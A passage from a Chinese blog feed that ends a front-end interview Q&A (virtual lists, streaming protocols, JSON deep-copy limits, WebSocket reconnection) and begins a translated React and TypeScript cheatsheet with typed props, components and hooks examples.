Loading）结合使用，以在需要时动态加载数据，进一步提高性能。</p><p>需要注意的是，虚拟列表的实现可以因框架和库的不同而有所不同，但它的核心原理是只渲染可见区域内的列表项，以减少渲染开销。</p><h5 id="虚拟列表减少多少加载时间"><a href="#虚拟列表减少多少加载时间" class="headerlink" title="虚拟列表减少多少加载时间"></a>虚拟列表减少多少加载时间</h5><p>虚拟列表（Virtual List）通常可以带来以下几个方面的性能优势：</p><ol><li><p><strong>更快的初始加载时间：</strong> 当列表非常大时，只渲染可见区域的列表项可以显著减少初始页面加载时间。因为不需要一次性渲染所有列表项，用户可以更快地看到部分内容。</p></li><li><p><strong>更低的内存消耗：</strong> 不渲染不可见区域的列表项可以减少页面的内存占用，这对于移动设备和性能较低的设备尤其重要。</p></li><li><p><strong>更平滑的滚动体验：</strong> 虚拟列表通常与滚动加载（Infinite Scroll）结合使用，这意味着当用户滚动列表时，只会渲染新可见区域的列表项，使得滚动更加平滑，不会因为加载大量列表项而产生卡顿。</p></li><li><p><strong>更好的交互性能：</strong> 虚拟列表可以提高列表的响应速度，因为只有可见区域的列表项需要交互响应，而不是整个列表。</p></li><li><p><strong>更少的网络请求：</strong> 在与后端进行数据交互时，虚拟列表通常会更智能地加载数据，仅请求可见区域的数据，而不是一次性请求整个列表的数据。</p></li></ol><p>总的来说，虚拟列表技术可以大幅改善大型列表的性能，减少加载时间和提高用户体验。然而，实际的性能优势取决于具体的实现方式、数据量以及浏览器和设备的性能。因此，在构建大型列表时，考虑使用虚拟列表来优化性能是一个明智的选择。</p><h3 id="15、介绍一下流媒体怎么实现"><a href="#15、介绍一下流媒体怎么实现" class="headerlink" title="15、介绍一下流媒体怎么实现"></a>15、介绍一下流媒体怎么实现</h3><p>流媒体是一种用于实时传输音频和视频内容的技术，它允许用户在数据下载的同时播放音频或视频，而不需要等待整个文件下载完成。流媒体的实现涉及多个关键组件和技术，以下是一个概述：</p><ol><li><p><strong>媒体编码：</strong> 首先，音频和视频内容需要经过媒体编码，以将其转换为数字格式，如AAC（音频编码）和H.264（视频编码）。这些编码通常具有压缩特性，以减小数据量并提高传输效率。</p></li><li><p><strong>媒体服务器：</strong> 媒体服务器是用于存储和分发音视频流的服务器。它们通常支持流式传输协议（如HTTP Live Streaming（HLS）或Dynamic Adaptive Streaming over HTTP（DASH））以及流式传输协议（如Real-Time Messaging Protocol（RTMP））等。媒体服务器可以在云端或本地部署，视需求而定。</p></li><li><p><strong>流式传输协议：</strong> 流式传输协议是用于将音频和视频流传送到用户设备的协议。以下是一些常见的流媒体协议：</p><ul><li><strong>HTTP Live Streaming (HLS)：</strong> HLS 是由苹果开发的流媒体协议，它将音视频内容划分为小片段，使用HTTP协议传输，允许适应不同带宽和设备。</li><li><strong>Dynamic Adaptive Streaming over HTTP (DASH)：</strong> DASH 是一个开放标准的流媒体协议，类似于HLS，它允许内容分段并使用HTTP进行分发。</li><li><strong>Real-Time Messaging Protocol (RTMP)：</strong> RTMP 是一种实时流媒体传输协议，通常用于直播和互动媒体。</li><li><strong>WebRTC：</strong> WebRTC（Web Real-Time Communication）是一个支持浏览器间实时音视频通信的开放标准，通常用于实时通信应用和视频会议。</li></ul></li><li><p><strong>流媒体客户端：</strong> 流媒体客户端是用户用于播放音频和视频流的应用程序或设备，如Web浏览器、移动应用、智能电视或流媒体播放器。这些客户端可以解码和呈现音视频内容，并提供用户交互和控制功能。</p></li><li><p><strong>自适应比特率：</strong> 流媒体系统通常支持自适应比特率（Adaptive Bitrate）技术，以根据用户设备的带宽和性能动态调整音视频质量。这意味着用户可以在不同网络条件下获得最佳的观看体验。</p></li><li><p><strong>内容分发网络（CDN）：</strong> CDN 是一种用于加速内容传输的网络，它通过分布式缓存和就近提供内容来减少延迟和提高流媒体质量。CDN 可以帮助确保音视频内容可以快速传送给全球观众。</p></li></ol><p>流媒体的实现需要考虑带宽管理、内容保护、实时编码、传输优化等多个方面的技术和策略。不同的流媒体平台和应用程序可能会选择不同的技术栈和协议，以满足其特定需求。流媒体技术在在线视频、音频直播、视频会议、在线游戏等领域得到广泛应用。</p><h3 id="16、如果用JSON-pare-JSON-stringfy-…-来实现深拷贝的话-会有什么问题吗"><a href="#16、如果用JSON-pare-JSON-stringfy-…-来实现深拷贝的话-会有什么问题吗" class="headerlink" title="16、如果用JSON.pare(JSON.stringfy(…))来实现深拷贝的话 会有什么问题吗"></a>16、如果用JSON.pare(JSON.stringfy(…))来实现深拷贝的话 会有什么问题吗</h3><p>使用<code>JSON.parse(JSON.stringify(...))</code>来实现深拷贝通常是有效的，但它存在一些限制和问题：</p><ol><li><p><strong>不能处理循环引用：</strong> 如果对象中包含循环引用，例如对象A包含一个指向自身的属性，那么<code>JSON.stringify</code>会抛出错误，因为JSON不支持循环引用。</p></li><li><p><strong>不能拷贝非JSON安全的对象：</strong> <code>JSON.stringify</code>将对象转换为JSON字符串，因此它不能处理特定类型的对象，如函数、正则表达式、<code>Map</code>、<code>Set</code>等。这些对象在转换过程中会被忽略或转换成<code>null</code>。</p></li><li><p><strong>不能拷贝特定对象的原型链：</strong> 使用<code>JSON.parse(JSON.stringify(...))</code>会创建一个新的对象，其原型链上的方法和属性都丢失。这可能不是您想要的行为，尤其是当对象的原型链中包含自定义的方法时。</p></li><li><p><strong>性能问题：</strong> 对于大型对象或嵌套层次深的对象，序列化和反序列化的性能开销较大，可能比其他深拷贝方法慢。</p></li></ol><p>如果您的数据结构是简单的JSON对象，而且不包含循环引用或非JSON安全的对象，那么<code>JSON.parse(JSON.stringify(...))</code>是一个方便且有效的深拷贝方法。但如果您的需求更复杂，需要处理循环引用、保留原型链或拷贝非JSON安全对象，那么您可能需要考虑使用专门的深拷贝库，或者编写自己的深拷贝函数来处理这些情况。</p><h3 id="17、websocket在弱网环境怎么办"><a href="#17、websocket在弱网环境怎么办" class="headerlink" title="17、websocket在弱网环境怎么办"></a>17、websocket在弱网环境怎么办</h3><p>WebSocket在弱网环境下可能会面临连接不稳定或断开的问题，这可能会影响实时通信的可靠性。以下是一些应对WebSocket在弱网环境中的问题的方法：</p><ol><li><p><strong>重连机制：</strong> 实现WebSocket的重连机制，以处理连接断开的情况。当检测到WebSocket连接断开时，您可以尝试重新建立连接，可以设置一个重连的时间间隔，避免过于频繁的重连。</p></li><li><p><strong>心跳检测：</strong> 使用心跳检测来监控WebSocket连接的状态。定期向服务器发送一个心跳消息，如果一段时间内没有收到响应，就认为连接已断开，并尝试重新连接。</p></li><li><p><strong>优化网络请求：</strong> 减少不必要的网络请求以降低网络带宽占用。只发送关键数据，避免发送大量不必要的信息。</p></li><li><p><strong>消息队列：</strong> 使用消息队列来缓冲待发送的消息，确保在网络不稳定或连接断开时，消息不会丢失。一旦连接恢复，将未发送的消息重新发送。</p></li><li><p><strong>断点续传：</strong> 对于大型数据传输，实现断点续传机制，以便在连接断开后能够恢复传输进度。</p></li><li><p><strong>使用CDN和负载均衡：</strong> 使用内容分发网络（CDN）可以降低网络延迟，并使用负载均衡来确保WebSocket连接分散在多个服务器上，以提高可用性和稳定性。</p></li><li><p><strong>降低数据频率：</strong> 如果可能的话，减少数据更新的频率。在弱网环境中，减少数据的传输频率可以减轻网络负担。</p></li><li><p><strong>使用备用通信通道：</strong> 考虑实现备用通信通道，例如长轮询或服务器发送事件（SSE），以便在WebSocket连接不可用时使用备用通道进行通信。</p></li><li><p><strong>用户体验处理：</strong> 提供用户友好的界面，以通知用户网络连接问题并提供恢复连接的选项。</p></li><li><p><strong>错误处理和日志记录：</strong> 实现详细的错误处理和日志记录，以便能够诊断和解决网络问题。</p></li></ol><p>在弱网环境下，网络不稳定是不可避免的，但通过实施上述策略，可以提高WebSocket应用程序在这种情况下的可靠性和鲁棒性。</p><h2 id="经验总结"><a href="#经验总结" class="headerlink" title="经验总结"></a>经验总结</h2><p>问题主要来自自己的面试总结及牛客上的面经，答案来自chatgpt，少部分来自中文网络。</p><p>面试经验：</p><ul><li>一个问题应作为一个启发点，需要刨根问底的真正理解，因为部分面试官会深挖，可以从 <strong>如何说（完整流程，可以延伸的点）&#x2F;如何用（适用场景、相关api）</strong> 两个方面来检测自己是否真的理解。</li><li>简历上的任何字眼都可能被拓展，很多面试官都是对着简历问细节，这比别人的面经更重要</li></ul>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>前端</tag>
      
      <tag>面试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>React &amp; TypeScript备忘录</title>
    <link href="/blog/2023/09/15/React%20&amp;%20TypeScript%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <url>/blog/2023/09/15/React%20&amp;%20TypeScript%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="React-amp-TypeScript备忘录"><a href="#React-amp-TypeScript备忘录" class="headerlink" title="React &amp; TypeScript备忘录"></a>React &amp; TypeScript备忘录</h1><blockquote><p><a href="https://react-typescript-cheatsheet.netlify.app/docs/basic/setup">https://react-typescript-cheatsheet.netlify.app/docs/basic/setup</a></p></blockquote><h3 id="React-和-TypeScript-入门套件"><a href="#React-和-TypeScript-入门套件" class="headerlink" title="React 和 TypeScript 入门套件"></a>React 和 TypeScript 入门<a href="https://react-typescript-cheatsheet.netlify.app/docs/basic/setup#react-and-typescript-starter-kits">套件</a></h3><p>React 提供了有关如何使用一些最流行的框架<a href="https://react.dev/learn/start-a-new-react-project">启动新的 React 项目的文档。</a>以下是如何使用 TypeScript 启动它们：</p><ul><li><a href="https://nextjs.org/docs/basic-features/typescript">Next.js</a>：<code>npx create-next-app@latest --ts</code></li><li><a href="https://remix.run/docs/tutorials/blog">混音</a>：<code>npx create-remix@latest</code></li><li><a href="https://www.gatsbyjs.com/docs/how-to/custom-configuration/typescript/">盖茨比</a>：<code>npm init gatsby --ts</code></li><li><a href="https://docs.expo.dev/guides/typescript/">世博会</a>：<code>npx create-react-native-app -t with-typescript</code></li></ul><h3 id="在线尝试-React-和-TypeScript"><a href="#在线尝试-React-和-TypeScript" class="headerlink" title="在线尝试 React 和 TypeScript"></a><a href="https://react-typescript-cheatsheet.netlify.app/docs/basic/setup#try-react-and-typescript-online">在线</a>尝试 React 和 TypeScript</h3><p>有一些工具可以让您在线运行 React 和 TypeScript，这有助于调试或制作可共享的复制品。</p><ul><li><a href="https://www.typescriptlang.org/play?target=8&jsx=4#code/JYWwDg9gTgLgBAbzgVwM4FMDKMCGN0A0KGAogGZnoDG8AvnGVBCHAORTo42sDcAsAChB6AB6RYcKhAB2qeAGEIyafihwAvHAAUASg0A+RILiSZcuAG0pymEQwxFNgLobiWXPi0AGHfyECTNHRyShotXQMjAJM4ABMIKmQQdBUAOhhgGAAbdFcAAwBNJUks4CoAa3RYuAASBGsVegzk1Dy-E1pfQWM4DhhkKGltHpMAHn0RmNGwfSLkErLK6vqlRrhm9FRRgHoZybGAI2QYGBk4GXlSivUECPVDe0cVLQb4AGo4AEYdWgnomJil0WcGS+zgOyOJxkfwBOxhcC6AlogiAA">TypeScript 游乐场</a></li><li><a href="https://stackblitz.com/fork/react-ts">堆栈闪电战</a></li><li><a href="https://ts.react.new/">代码沙箱</a></li></ul><h3 id="1、常用类型"><a href="#1、常用类型" class="headerlink" title="1、常用类型"></a>1、常用类型</h3><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">type</span> <span class="hljs-title class_">AppProps</span> = &#123;<br>  <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-attr">disabled</span>: <span class="hljs-built_in">boolean</span>;<br>  <span class="hljs-comment">/** array of a type! */</span><br>  <span class="hljs-attr">names</span>: <span class="hljs-built_in">string</span>[];<br>  <span class="hljs-comment">/** string literals to specify exact string values, with a union type to join them together */</span><br>  <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;waiting&quot;</span> | <span class="hljs-string">&quot;success&quot;</span>;<br>  <span class="hljs-comment">/** an object with known properties (but could have more at runtime) */</span><br>  <span class="hljs-attr">obj</span>: &#123;<br>    <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;<br>    <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>;<br>  &#125;;<br>  <span class="hljs-comment">/** array of objects! (common) */</span><br>  <span class="hljs-attr">objArr</span>: &#123;<br>    <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;<br>    <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>;<br>  &#125;[];<br>  <span class="hljs-comment">/** any non-primitive value - can&#x27;t access any properties (NOT COMMON but useful as placeholder) */</span><br>  <span class="hljs-attr">obj2</span>: <span class="hljs-built_in">object</span>;<br>  <span class="hljs-comment">/** an interface with no required properties - (NOT COMMON, except for things like `React.Component&lt;&#123;&#125;, State&gt;`) */</span><br>  <span class="hljs-attr">obj3</span>: &#123;&#125;;<br>  <span class="hljs-comment">/** a dict object with any number of properties of the same type */</span><br>  <span class="hljs-attr">dict1</span>: &#123;<br>    [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-title class_">MyTypeHere</span>;<br>  &#125;;<br>  <span class="hljs-attr">dict2</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">MyTypeHere</span>&gt;; <span class="hljs-comment">// equivalent to dict1</span><br>  <span class="hljs-comment">/** function that doesn&#x27;t take or return anything (VERY COMMON) */</span><br>  <span class="hljs-attr">onClick</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;<br>  <span class="hljs-comment">/** function with named prop (VERY COMMON) */</span><br>  <span class="hljs-attr">onChange</span>: <span class="hljs-function">(<span class="hljs-params">id: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>;<br>  <span class="hljs-comment">/** function type syntax that takes an event (VERY COMMON) */</span><br>  <span class="hljs-attr">onChange</span>: <span class="hljs-function">(<span class="hljs-params">event: React.ChangeEvent&lt;HTMLInputElement&gt;</span>) =&gt;</span> <span class="hljs-built_in">void</span>;<br>  <span class="hljs-comment">/** alternative function type syntax that takes an event (VERY COMMON) */</span><br>  <span class="hljs-title function_">onClick</span>(<span class="hljs-attr">event</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">MouseEvent</span>&lt;<span class="hljs-title class_">HTMLButtonElement</span>&gt;): <span class="hljs-built_in">void</span>;<br>  <span class="hljs-comment">/** any function as long as you don&#x27;t invoke it (not recommended) */</span><br>  <span class="hljs-attr">onSomething</span>: <span class="hljs-title class_">Function</span>;<br>  <span class="hljs-comment">/** an optional prop (VERY COMMON!) */</span><br>  optional?: <span class="hljs-title class_">OptionalType</span>;<br>  <span class="hljs-comment">/** when passing down the state setter function returned by `useState` to a child component. `number` is an example, swap out with whatever the type of your state */</span><br>  <span class="hljs-attr">setState</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">Dispatch</span>&lt;<span class="hljs-title class_">React</span>.<span class="hljs-property">SetStateAction</span>&lt;<span class="hljs-built_in">number</span>&gt;&gt;;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>object</code> 是 TypeScript 中常见的误解来源。它并不意味着“任何对象”，而是“任何非原始类型”，这意味着它代表任何不是<code>number</code>、<code>string</code>、<code>boolean</code>、<code>symbol</code>或<code>null</code>的东西<code>undefined</code>。在 React 中键入“任何非原始值”很可能不是您应该做的事情，这意味着您可能不会使用<code>object</code> 太多。</li><li><code>&#123;&#125;</code>和<code>Object</code> 全部代表“任何非空值”，而不是您可能认为的“空对象”。赋值<code>null</code>或者<code>undefined</code>时会报错。</li></ul><p><code>React Props</code>类型：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">export</span> <span class="hljs-keyword">declare</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">AppProps</span> &#123;<br>  children?: <span class="hljs-title class_">React</span>.<span class="hljs-property">ReactNode</span>; <span class="hljs-comment">// best, accepts everything React can render</span><br>  <span class="hljs-attr">childrenElement</span>: <span class="hljs-variable constant_">JSX</span>.<span class="hljs-property">Element</span>; <span class="hljs-comment">// A single React element</span><br>  style?: <span class="hljs-title class_">React</span>.<span class="hljs-property">CSSProperties</span>; <span class="hljs-comment">// to pass through style props</span><br>  onChange?: <span class="hljs-title class_">React</span>.<span class="hljs-property">FormEventHandler</span>&lt;<span class="hljs-title class_">HTMLInputElement</span>&gt;; <span class="hljs-comment">// form events! the generic parameter is the type of event.target</span><br>  <span class="hljs-comment">//  more info: https://react-typescript-cheatsheet.netlify.app/docs/advanced/patterns_by_usecase/#wrappingmirroring</span><br>  <span class="hljs-attr">props</span>: <span class="hljs-title class_">Props</span> &amp; <span class="hljs-title class_">React</span>.<span class="hljs-property">ComponentPropsWithoutRef</span>&lt;<span class="hljs-string">&quot;button&quot;</span>&gt;; <span class="hljs-comment">// to impersonate all the props of a button element and explicitly not forwarding its ref</span><br>  <span class="hljs-attr">props2</span>: <span class="hljs-title class_">Props</span> &amp; <span class="hljs-title class_">React</span>.<span class="hljs-property">ComponentPropsWithRef</span>&lt;<span class="hljs-title class_">MyButtonWithForwardRef</span>&gt;; <span class="hljs-comment">// to impersonate all the props of MyButtonForwardedRef and explicitly forwarding its ref</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>使用 Interface 直到您需要 Type。</p></li><li><p>这是一个有用的经验法则：</p><ul><li>在创作库或第 3 方环境类型定义时，始终使用<code>interface</code>公共 API 的定义，因为这允许使用者在缺少某些定义时通过<em>声明合并来扩展它们。</em></li><li>考虑用于<code>type</code>您的 React 组件 Props 和 State，以保持一致性并且因为它受到更多限制。</li></ul></li><li><p>类型对于联合类型（例如）很有用，<code>type MyType = TypeA | TypeB</code>而接口更适合声明字典形状然后<code>implementing</code>或<code>extending</code>它们。</p></li></ul><h3 id="2、功能组件"><a href="#2、功能组件" class="headerlink" title="2、功能组件"></a>2、功能组件</h3><p>这些可以编写为带有<code>props</code>参数并返回 JSX 元素的普通函数。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-comment">// Declaring type of props - see &quot;Typing Component Props&quot; for more examples</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">AppProps</span> = &#123;<br>  <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span>;<br>&#125;; <span class="hljs-comment">/* use `interface` if exporting so that consumers can extend */</span><br><br><span class="hljs-comment">// Easiest way to declare a Function Component; return type is inferred.</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params">&#123; message &#125;: AppProps</span>) =&gt; <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;message&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br><br><span class="hljs-comment">// you can choose annotate the return type so an error is raised if you accidentally return some other type</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">App</span> = (&#123; message &#125;: <span class="hljs-title class_">AppProps</span>): <span class="hljs-variable constant_">JSX</span>.<span class="hljs-property">Element</span> =&gt; <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;message&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br><br><span class="hljs-comment">// you can also inline the type declaration; eliminates naming the prop types, but looks repetitive</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params">&#123; message &#125;: &#123; message: <span class="hljs-built_in">string</span> &#125;</span>) =&gt; <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;message&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br><br><span class="hljs-comment">// Alternatively, you can use `React.FunctionComponent` (or `React.FC`), if you prefer.</span><br><span class="hljs-comment">// With latest React types and TypeScript 5.1. it&#x27;s mostly a stylistic choice, otherwise discouraged.</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">App</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FunctionComponent</span>&lt;&#123; <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span> &#125;&gt; = <span class="hljs-function">(<span class="hljs-params">&#123; message &#125;</span>) =&gt;</span> (<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;message&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>);<br></code></pre></td></tr></table></figure><p>提示：您可以使用<a href="https://marketplace.visualstudio.com/items?itemName=paulshen.paul-typescript-toolkit">Paul Shen 的 VS Code Extension</a>来自动执行类型解构声明（包括<a href="https://twitter.com/_paulshen/status/1392915279466745857?s=20">键盘快捷键</a>）。</p><h3 id="3、hooks"><a href="#3、hooks" class="headerlink" title="3、hooks"></a>3、hooks</h3><p><a href="https://github.com/DefinitelyTyped/DefinitelyTyped/blob/a05cc538a42243c632f054e42eab483ebf1560ab/types/react/index.d.ts#L800-L1031">从 v16.8 开始</a><a href="https://github.com/DefinitelyTyped/DefinitelyTyped/blob/a05cc538a42243c632f054e42eab483ebf1560ab/types/react/index.d.ts#L800-L1031">支持<code>@types/react</code></a>Hooks 。</p><p>许多钩子都是用 null-ish 默认值初始化的，您可能想知道如何提供类型。显式声明类型，并使用联合类型：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">const</span> [user, setUser] = useState&lt;<span class="hljs-title class_">User</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);<br><br><span class="hljs-comment">// later...</span><br><span class="hljs-title function_">setUser</span>(newUser);<br></code></pre></td></tr></table></figure><p>如果状态在设置后不久初始化并且始终具有以下值，则还可以使用类型断言：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">const</span> [user, setUser] = useState&lt;<span class="hljs-title class_">User</span>&gt;(&#123;&#125; <span class="hljs-keyword">as</span> <span class="hljs-title class_">User</span>);<br><br><span class="hljs-comment">// later...</span><br><span class="hljs-title function_">setUser</span>(newUser);<br></code></pre></td></tr></table></figure><p><code>&#123;&#125;</code>这暂时“欺骗”了类型的TypeScript 编译器<code>User</code>。您应该通过设置状态来跟进<code>user</code>- 如果您不这样做，代码的其余部分可能会依赖于<code>user</code>类型这一事实<code>User</code>，并且可能会导致运行时错误。</p><h4 id="使用useCallback"><a href="#使用useCallback" class="headerlink" title="使用useCallback"></a>使用useCallback</h4><p><code>useCallback</code>您可以像输入任何其他函数一样输入。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-keyword">const</span> memoizedCallback = <span class="hljs-title function_">useCallback</span>(<br>  <span class="hljs-function">(<span class="hljs-params">param1: <span class="hljs-built_in">string</span>, param2: <span class="hljs-built_in">number</span></span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(param1, param2)<br>    <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">ok</span>: <span class="hljs-literal">true</span> &#125;<br>  &#125;,<br>  [...],<br>);<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * VSCode will show the following type:</span><br><span class="hljs-comment"> * const memoizedCallback:</span><br><span class="hljs-comment"> *  (param1: string, param2: number) =&gt; &#123; ok: boolean &#125;</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p><code>useCallback</code>请注意，对于 React &lt; 18，默认情况下类型参数的函数签名<code>any[]</code>：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-keyword">function</span> useCallback&lt;T <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]) =&gt; <span class="hljs-built_in">any</span>&gt;(<br>  <span class="hljs-attr">callback</span>: T,<br>  <span class="hljs-attr">deps</span>: <span class="hljs-title class_">DependencyList</span><br>): T;<br></code></pre></td></tr></table></figure><p>在 React &gt;&#x3D; 18 中，函数签名<code>useCallback</code>更改为以下内容：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-keyword">function</span> useCallback&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Function</span>&gt;(<span class="hljs-attr">callback</span>: T, <span class="hljs-attr">deps</span>: <span class="hljs-title class_">DependencyList</span>): T;<br></code></pre></td></tr></table></figure><p>因此，以下代码<code>Parameter &#39;e&#39; implicitly has an &#39;any&#39; type.</code>在 React &gt;&#x3D; 18 中将产生“ ”错误，但在 &lt;17 中则不会。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-comment">// @ts-expect-error Parameter &#x27;e&#x27; implicitly has &#x27;any&#x27; type.</span><br><span class="hljs-title function_">useCallback</span>(<span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;&#125;, []);<br><span class="hljs-comment">// Explicit &#x27;any&#x27; type.</span><br><span class="hljs-title function_">useCallback</span>(<span class="hljs-function">(<span class="hljs-params">e: <span class="hljs-built_in">any</span></span>) =&gt;</span> &#123;&#125;, []);<br></code></pre></td></tr></table></figure><h4 id="使用Reducer"><a href="#使用Reducer" class="headerlink" title="使用Reducer"></a>使用Reducer</h4><p>您可以使用<a href="https://www.typescriptlang.org/docs/handbook/typescript-in-5-minutes-func.html#discriminated-unions">可区分联合</a>来执行Reducer操作。不要忘记定义reducer的返回类型，否则TypeScript会推断它。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> &#123; useReducer &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;react&quot;</span>;<br><br><span class="hljs-keyword">const</span> initialState = &#123; <span class="hljs-attr">count</span>: <span class="hljs-number">0</span> &#125;;<br><br>type <span class="hljs-variable constant_">ACTIONTYPE</span> =<br>  | &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;increment&quot;</span>; <span class="hljs-attr">payload</span>: number &#125;<br>  | &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;decrement&quot;</span>; <span class="hljs-attr">payload</span>: string &#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">reducer</span>(<span class="hljs-params">state: <span class="hljs-keyword">typeof</span> initialState, action: ACTIONTYPE</span>) &#123;<br>  <span class="hljs-keyword">switch</span> (action.<span 